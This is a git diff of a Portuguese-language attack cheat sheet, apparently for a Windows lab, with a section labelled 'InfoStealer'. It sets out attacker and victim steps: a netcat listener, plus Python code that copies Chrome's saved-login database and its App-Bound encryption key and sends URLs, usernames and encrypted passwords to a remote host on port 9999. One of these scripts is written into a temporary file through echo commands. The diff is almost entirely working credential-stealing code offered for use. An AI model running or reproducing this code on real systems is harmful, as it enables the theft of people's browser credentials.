@@ -251,7 +251,7 @@ powershell -command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Win
 powershell -command "Add-Type -AssemblyName System.Windows.Forms; $code='using System; using System.Runtime.InteropServices; public class MouseClick { [DllImport(\"user32.dll\")] public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo); }'; Add-Type $code; [System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(499,491); Start-Sleep -Milliseconds 100; [MouseClick]::mouse_event(2,0,0,0,[UIntPtr]::Zero); [MouseClick]::mouse_event(4,0,0,0,[UIntPtr]::Zero)"
 ```
 
-### 6. InfoStealer - Roubar senhas do Navegador
+### 6. InfoStealer - Roubar users do navegador, senha criptografada
 ### No shell do atacante
 ``` cmd
 nc -lvnp 9999 > chrome_passwords.txt
@@ -261,3 +261,58 @@ nc -lvnp 9999 > chrome_passwords.txt
 ``` cmd
 python -c "import os, sqlite3, shutil, tempfile, socket; login_data = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Default\Login Data'; temp_db = tempfile.mktemp(suffix='.db'); shutil.copy2(login_data, temp_db); conn = sqlite3.connect(temp_db); cursor = conn.cursor(); cursor.execute('SELECT origin_url, username_value, password_value FROM logins'); result = ''; [result := result + f'URL: {url}\nUser: {user}\nPass: {pwd.hex()}\n\n' for url, user, pwd in cursor.fetchall()]; conn.close(); os.unlink(temp_db); s = socket.socket(); s.settimeout(5); s.connect(('10.0.0.34', 9999)); s.send(result.encode() if result else b'NO_PASSWORDS_FOUND'); s.close(); print('Enviado:', len(result), 'bytes')"
 ```
+
+### SHELL DO ATACANTE
+``` cmd
+nc -lvnp 9999 | tee passwords_full.json
+```
+
+### SHELL DA VITIMA
+``` cmd
+echo import os, sqlite3, shutil, tempfile, socket, subprocess, json, base64 > %TEMP%\final_v2.py
+echo. >> %TEMP%\final_v2.py
+echo # Lê a chave App-Bound do Local State >> %TEMP%\final_v2.py
+echo local_state_path = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State' >> %TEMP%\final_v2.py
+echo with open(local_state_path, 'r') as f: >> %TEMP%\final_v2.py
+echo     local_state = json.load(f) >> %TEMP%\final_v2.py
+echo app_bound_key_b64 = local_state['os_crypt']['app_bound_encrypted_key'] >> %TEMP%\final_v2.py
+echo print('Chave App-Bound encontrada') >> %TEMP%\final_v2.py
+echo. >> %TEMP%\final_v2.py
+echo # Extrai senhas >> %TEMP%\final_v2.py
+echo login_data = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Default\Login Data' >> %TEMP%\final_v2.py
+echo temp_db = tempfile.mktemp(suffix='.db') >> %TEMP%\final_v2.py
+echo shutil.copy2(login_data, temp_db) >> %TEMP%\final_v2.py
+echo conn = sqlite3.connect(temp_db) >> %TEMP%\final_v2.py
+echo cursor = conn.cursor() >> %TEMP%\final_v2.py
+echo cursor.execute('SELECT origin_url, username_value, password_value FROM logins') >> %TEMP%\final_v2.py
+echo. >> %TEMP%\final_v2.py
+echo # Salva em formato JSON >> %TEMP%\final_v2.py
+echo output = {'app_bound_key': app_bound_key_b64, 'passwords': []} >> %TEMP%\final_v2.py
+echo for url, user, pwd in cursor.fetchall(): >> %TEMP%\final_v2.py
+echo     output['passwords'].append({ >> %TEMP%\final_v2.py
+echo         'url': url, >> %TEMP%\final_v2.py
+echo         'username': user, >> %TEMP%\final_v2.py
+echo         'password_b64': base64.b64encode(pwd).decode(), >> %TEMP%\final_v2.py
+echo         'password_hex': pwd.hex(), >> %TEMP%\final_v2.py
+echo         'prefix': pwd[:4].hex() >> %TEMP%\final_v2.py
+echo     }) >> %TEMP%\final_v2.py
+echo conn.close() >> %TEMP%\final_v2.py
+echo os.unlink(temp_db) >> %TEMP%\final_v2.py
+echo. >> %TEMP%\final_v2.py
+echo result = json.dumps(output, indent=2) >> %TEMP%\final_v2.py
+echo print(result) >> %TEMP%\final_v2.py
+echo. >> %TEMP%\final_v2.py
+echo # Envia >> %TEMP%\final_v2.py
+echo try: >> %TEMP%\final_v2.py
+echo     s = socket.socket(); s.settimeout(10) >> %TEMP%\final_v2.py
+echo     s.connect(('10.0.0.34', 9999)); s.send(result.encode()); s.close() >> %TEMP%\final_v2.py
+echo     print('ENVIADO!') >> %TEMP%\final_v2.py
+echo except Exception as e: >> %TEMP%\final_v2.py
+echo     print(f'Erro envio: {e}') >> %TEMP%\final_v2.py
+```
+### DEPOIS RODE
+``` cmd
+python %TEMP%\final_v2.py
+```
+
+
